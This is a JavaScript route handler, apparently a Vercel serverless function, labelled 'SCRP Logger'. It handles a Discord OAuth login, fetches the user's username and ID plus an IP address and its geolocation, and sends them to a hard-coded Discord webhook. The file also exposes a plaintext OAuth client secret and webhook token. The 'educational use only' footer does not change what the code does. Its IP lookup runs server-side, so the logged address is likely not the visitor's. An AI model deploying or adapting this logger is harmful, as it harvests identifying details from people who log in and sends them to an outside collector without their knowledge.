export async function GET(req) {
  const { searchParams } = new URL(req.url);
    const code = searchParams.get("code");

      if (!code) {
          return new Response("Missing code from Discord", { status: 400 });
            }

              // Exchange code for token
                const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
                    method: "POST",
                        headers: { "Content-Type": "application/x-www-form-urlencoded" },
                            body: new URLSearchParams({
                                  client_id: "1388702262829781093",
                                        client_secret: "oKdkh7KGFD2cckPy5XZR_--TzCw34Q_5",
                                              grant_type: "authorization_code",
                                                    code,
                                                          redirect_uri: "https://scrpsites.vercel.app/api/callback",
                                                                scope: "identify",
                                                                    }),
                                                                      });

                                                                        const tokenData = await tokenRes.json();

                                                                          if (!tokenData.access_token) {
                                                                              return new Response("Failed to get Discord token", { status: 400 });
                                                                                }

                                                                                  // Fetch user info
                                                                                    const userRes = await fetch("https://discord.com/api/users/@me", {
                                                                                        headers: {
                                                                                              Authorization: `Bearer ${tokenData.access_token}`,
                                                                                                  },
                                                                                                    });

                                                                                                      const user = await userRes.json();

                                                                                                        // Get IP address
                                                                                                          const ipRes = await fetch("https://api.ipify.org?format=json");
                                                                                                            const ipData = await ipRes.json();

                                                                                                              // Get city and country from IP
                                                                                                                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                                                                                                                  const geoData = await geoRes.json();

                                                                                                                    const city = geoData.city || "Unknown";
                                                                                                                      const country = geoData.country_name || "Unknown";

                                                                                                                        // Send embed to webhook
                                                                                                                          await fetch("https://discord.com/api/webhooks/1388707471228670062/k5Nwg7siYplB7EBFxk6AMH1qS08d6LoxAP4PMnaUuBZSw02G9iTht9F7eWJQmMfcUdNx", {
                                                                                                                              method: "POST",
                                                                                                                                  headers: { "Content-Type": "application/json" },
                                                                                                                                      body: JSON.stringify({
                                                                                                                                            embeds: [
                                                                                                                                                    {
                                                                                                                                                              title: "✅ New Discord Login",
                                                                                                                                                                        color: 16777215, // white
                                                                                                                                                                                  fields: [
                                                                                                                                                                                              { name: "👤 Username", value: `${user.username}#${user.discriminator}`, inline: true },
                                                                                                                                                                                                          { name: "🆔 User ID", value: `${user.id}`, inline: true },
                                                                                                                                                                                                                      { name: "🌐 IP Address", value: ipData.ip, inline: false },
                                                                                                                                                                                                                                  { name: "📍 Location", value: `${city}, ${country}`, inline: false },
                                                                                                                                                                                                                                            ],
                                                                                                                                                                                                                                                      footer: {
                                                                                                                                                                                                                                                                  text: "SCRP Logger • Educational use only",
                                                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                                                                      timestamp: new Date().toISOString(),
                                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                                                    ]
                                                                                                                                                                                                                                                                                                        }),
                                                                                                                                                                                                                                                                                                          });

                                                                                                                                                                                                                                                                                                            return Response.redirect("https://scrpsites.vercel.app/?success=true", 302);
                                                                                                                                                                                                                                                                                                            }
